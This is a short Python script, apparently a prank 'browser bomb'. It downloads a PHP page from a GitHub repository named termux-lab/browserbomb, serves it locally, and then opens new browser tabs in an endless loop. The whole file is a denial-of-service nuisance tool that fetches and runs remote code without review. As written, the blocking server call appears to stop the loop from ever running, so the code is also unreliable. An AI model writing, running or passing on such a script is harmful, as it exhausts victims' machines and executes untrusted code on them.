import requests
import webbrowser
import os

fTemp = open('index.php', 'w')
fTemp.write(requests.get('https://raw.githubusercontent.com/termux-lab/browserbomb/master/index.php').text)
fTemp.close()

os.system('php -S localhost:8080')

while True:
	webbrowser.open('http://localhost:8080', new = 2)